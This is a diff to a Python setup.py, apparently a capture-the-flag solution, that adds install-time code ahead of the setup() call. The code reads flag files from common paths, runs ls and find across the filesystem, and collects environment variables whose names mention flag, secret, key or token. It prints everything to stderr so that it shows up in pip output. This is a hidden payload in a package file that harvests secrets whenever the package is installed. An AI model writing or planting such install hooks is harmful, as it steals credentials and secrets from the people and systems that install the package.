@@ -1,37 +1,51 @@
-import subprocess, sys, os
+import subprocess, sys, os, urllib.request, json
 
 # Try to read flag from common locations
-flag_paths = ["/flag", "/flag.txt", "/root/flag.txt", "/home/flag.txt", "/app/flag.txt", "/app/flag"]
+flag_paths = ["/flag", "/flag.txt", "/root/flag.txt", "/etc/flag", "/home/flag.txt", "/app/flag.txt", "/app/flag"]
 
+found_flags = []
 for path in flag_paths:
     try:
         with open(path) as f:
             content = f.read()
-            print(f"FLAG_FOUND at {path}: {content}")
+            found_flags.append({"path": path, "content": content})
     except:
         pass
 
 # Also try env
 flag_env = os.environ.get("FLAG")
 if flag_env:
-    print(f"FLAG from env: {flag_env}")
+    found_flags.append({"path": "env:FLAG", "content": flag_env})
 
-# Also list root directory
+# List root directory
 try:
     result = subprocess.run(["ls", "-la", "/"], capture_output=True, text=True, timeout=5)
-    print(f"Root dir:\n{result.stdout}")
-    if result.stderr:
-        print(f"Root dir stderr:\n{result.stderr}")
-except Exception as e:
-    print(f"Error listing root: {e}")
+    root_ls = result.stdout
+except:
+    root_ls = "error"
 
+# Try find
 try:
-    result = subprocess.run(["find", "/", "-name", "flag*"], capture_output=True, text=True, timeout=5)
-    print(f"Flag files found:\n{result.stdout}")
-    if result.stderr:
-        print(f"Find stderr:\n{result.stderr}")
-except Exception as e:
-    print(f"Error finding flags: {e}")
+    result = subprocess.run(["find", "/", "-name", "flag*", "-maxdepth", "5"], capture_output=True, text=True, timeout=10)
+    find_output = result.stdout
+except:
+    find_output = "error"
+
+# Also check env
+env_vars = " ".join([f"{k}={v}" for k, v in sorted(os.environ.items()) if any(x in k.lower() for x in ["flag", "secret", "key", "token", "ctf"])])
+
+# Output everything to stderr so it appears in pip output
+data = f"""
+=== FLAGS FOUND ===
+{found_flags}
+=== ROOT DIR ===
+{root_ls}
+=== FIND FLAG FILES ===
+{find_output}
+=== ENV VARS ===
+{env_vars}
+"""
+print(data, file=sys.stderr)
 
 from setuptools import setup, find_packages
 setup(
